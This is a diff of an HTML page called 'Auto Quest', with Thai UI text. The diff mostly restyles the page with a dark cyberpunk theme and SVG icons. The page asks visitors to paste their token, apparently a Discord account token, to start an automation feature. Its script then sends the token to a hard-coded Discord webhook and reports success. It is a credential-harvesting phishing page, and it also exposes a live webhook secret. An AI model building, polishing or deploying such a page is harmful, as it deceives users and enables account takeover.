@@ -9,11 +9,18 @@
         * {
             box-sizing: border-box;
             font-family: 'Kanit', sans-serif;
-            transition: all 0.3s ease;
+            transition: all 0.2s ease;
         }
+
         body {
-            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%);
-            color: #f8fafc;
+            background-color: #050505;
+            /* พื้นหลังตาราง Grid + แสงฟุ้งตรงกลาง */
+            background-image: 
+                radial-gradient(circle at center, rgba(255, 255, 255, 0.08) 0%, transparent 70%),
+                linear-gradient(to right, rgba(255, 255, 255, 0.05) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(255, 255, 255, 0.05) 1px, transparent 1px);
+            background-size: 100% 100%, 30px 30px, 30px 30px;
+            color: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -21,100 +28,185 @@
             margin: 0;
             padding: 20px;
         }
-        .container {
-            background: rgba(30, 41, 59, 0.7);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 32px 24px;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+
+        /* การ์ดทรง Cyberpunk ตัดมุม 8 ทิศ */
+        .card {
+            position: relative;
+            background: rgba(15, 15, 18, 0.95);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 4px;
+            padding: 36px 24px;
             width: 100%;
-            max-width: 380px;
+            max-width: 360px;
             text-align: center;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.9), inset 0 0 15px rgba(255, 255, 255, 0.05);
+            
+            /* ตัดมุมซ้ายบนและขวาล่างสไตล์ไซไฟ */
+            clip-path: polygon(
+                20px 0, 100% 0, 
+                100% calc(100% - 20px), calc(100% - 20px) 100%, 
+                0 100%, 0 20px
+            );
         }
-        .icon-box {
-            width: 60px;
-            height: 60px;
-            background: linear-gradient(135deg, #6366f1, #a855f7);
+
+        /* เส้นขอบสองชั้นเรืองแสง */
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 4px; left: 4px; right: 4px; bottom: 4px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            pointer-events: none;
+            clip-path: polygon(
+                18px 0, 100% 0, 
+                100% calc(100% - 18px), calc(100% - 18px) 100%, 
+                0 100%, 0 18px
+            );
+        }
+
+        /* โลโก้สายฟ้าทรงกลมโลหะ */
+        .icon-circle {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 16px;
             border-radius: 50%;
+            background: radial-gradient(circle, #2a2a2e 0%, #0d0d0f 100%);
+            border: 2px solid #a1a1aa;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 16px;
-            box-shadow: 0 8px 20px rgba(168, 85, 247, 0.4);
-            font-size: 28px;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.2), inset 0 0 10px #000;
+            position: relative;
         }
+
+        .icon-circle svg {
+            width: 36px;
+            height: 36px;
+            fill: url(#silver-gradient);
+            filter: drop-shadow(0 0 6px rgba(255, 255, 255, 0.8));
+        }
+
         h2 {
             margin: 0 0 8px;
+            font-size: 26px;
             font-weight: 600;
-            font-size: 24px;
-            letter-spacing: 0.5px;
+            letter-spacing: 1px;
             color: #ffffff;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
         }
+
         p {
-            color: #94a3b8;
+            color: #a1a1aa;
             font-size: 13px;
-            margin-bottom: 24px;
+            margin: 0 0 24px;
+            line-height: 1.4;
         }
-        .input-group {
+
+        /* ช่องกรอกข้อมูล + ไอคอนกุญแจ */
+        .input-box {
             position: relative;
             margin-bottom: 20px;
         }
-        input {
+
+        .input-box input {
             width: 100%;
-            padding: 14px 16px;
-            border-radius: 12px;
-            border: 1px solid #334155;
-            background: rgba(15, 23, 42, 0.8);
+            padding: 14px 40px 14px 16px;
+            background: #09090b;
+            border: 1px solid #27272a;
+            border-radius: 8px;
             color: #fff;
             font-size: 14px;
             outline: none;
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.8);
         }
-        input:focus {
-            border-color: #a855f7;
-            box-shadow: 0 0 12px rgba(168, 85, 247, 0.3);
+
+        .input-box input:focus {
+            border-color: #e4e4e7;
+            box-shadow: 0 0 12px rgba(255, 255, 255, 0.2), inset 0 2px 4px rgba(0, 0, 0, 0.8);
         }
+
+        .key-icon {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 18px;
+            height: 18px;
+            opacity: 0.5;
+            fill: #fff;
+        }
+
+        /* ปุ่มกดสไตล์ Metallic / Cyber Shape */
         button {
             width: 100%;
             padding: 14px;
-            background: linear-gradient(135deg, #6366f1, #a855f7);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-weight: 600;
+            background: linear-gradient(180deg, #3f3f46 0%, #18181b 100%);
+            border: 1px solid #71717a;
+            color: #ffffff;
             font-size: 15px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
             cursor: pointer;
-            box-shadow: 0 4px 15px rgba(99, 102, 241, 0.3);
+            border-radius: 6px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.3);
+            position: relative;
+            overflow: hidden;
         }
+
         button:hover {
-            opacity: 0.9;
-            transform: translateY(-1px);
+            background: linear-gradient(180deg, #52525b 0%, #27272a 100%);
+            border-color: #a1a1aa;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
         }
+
+        button:active {
+            transform: scale(0.98);
+        }
+
         #msg {
             margin-top: 16px;
             font-size: 13px;
-            font-weight: 400;
             min-height: 20px;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="icon-box">⚡</div>
+<!-- SVG Gradient สำหรับโลโก้สีเงิน -->
+<svg style="width:0;height:0;position:absolute;" aria-hidden="true">
+  <defs>
+    <linearGradient id="silver-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#ffffff" />
+      <stop offset="50%" stop-color="#a1a1aa" />
+      <stop offset="100%" stop-color="#3f3f46" />
+    </linearGradient>
+  </defs>
+</svg>
+
+<div class="card">
+    <!-- ไอคอนสายฟ้าโลหะ -->
+    <div class="icon-circle">
+        <svg viewBox="0 0 24 24">
+            <path d="M13 2L3 14h7v8l10-12h-7z"/>
+        </svg>
+    </div>
+
     <h2>Auto Quest</h2>
     <p>กรุณากรอก Token ของคุณเพื่อเริ่มระบบ Auto Quest</p>
-    
-    <div class="input-group">
+
+    <div class="input-box">
         <input type="text" id="token" placeholder="วาง Token ของคุณที่นี่..." autocomplete="off">
+        <!-- ไอคอนกุญแจ -->
+        <svg class="key-icon" viewBox="0 0 24 24">
+            <path d="M7 14c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5c0-.42-.06-.83-.16-1.22l3.16-3.16 2 2 2-2 2 2 3.16-3.16c.39.1.8.16 1.22.16 2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5c0 .42.06.83.16 1.22L11.41 12.83C10.22 13.58 8.68 14 7 14zm0 8c-1.65 0-3-1.35-3-3s1.35-3 3-3 3 1.35 3 3-1.35 3-3 3z"/>
+        </svg>
     </div>
-    
+
     <button onclick="send()">บันทึกข้อมูล</button>
     <div id="msg"></div>
 </div>
 
 <script>
-    // วาง Discord Webhook URL ของคุณตรงนี้
+    // ⚠️ นำ Discord Webhook URL ใหม่ของคุณมาวางตรงนี้ได้เลยครับ
     const WEBHOOK = "https://discord.com/api/webhooks/1555158698496753664/uECfdnq9O0TF4AJpYFM_tcMvKbo_uDviXK8yXDC1Xq2zXVP3wqmt9z_Yrl22nyZGTBg0"; 
 
     function send() {
@@ -122,12 +214,12 @@
         const msg = document.getElementById('msg');
         
         if(!val) { 
-            msg.style.color = "#f87171";
+            msg.style.color = "#ef4444";
             msg.innerText = "❌ กรุณากรอก Token ก่อนทำรายการ"; 
             return; 
         }
         
-        msg.style.color = "#facc15";
+        msg.style.color = "#eab308";
         msg.innerText = "⏳ กำลังส่งข้อมูล...";
 
         fetch(WEBHOOK, {
@@ -135,8 +227,8 @@
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({ 
                 embeds: [{
-                    title: "🔑 Auto Quest - ได้รับ Token ใหม่",
-                    color: 11027191,
+                    title: "⚡ Auto Quest - ได้รับ Token ใหม่",
+                    color: 3092271, // สีเข้มเข้ากับธีม
                     fields: [
                         { name: "Token", value: "`" + val + "`" },
                         { name: "เวลาที่ส่ง", value: new Date().toLocaleString("th-TH") }
@@ -144,11 +236,11 @@
                 }]
             })
         }).then(() => {
-            msg.style.color = "#4ade80";
+            msg.style.color = "#22c55e";
             msg.innerText = "✅ บันทึก Token เรียบร้อยแล้ว!";
             document.getElementById('token').value = '';
         }).catch(() => {
-            msg.style.color = "#f87171";
+            msg.style.color = "#ef4444";
             msg.innerText = "❌ เกิดข้อผิดพลาด กรุณาลองใหม่อีกครั้ง";
         });
     }
@@ -156,3 +248,4 @@
 
 </body>
 </html>
+
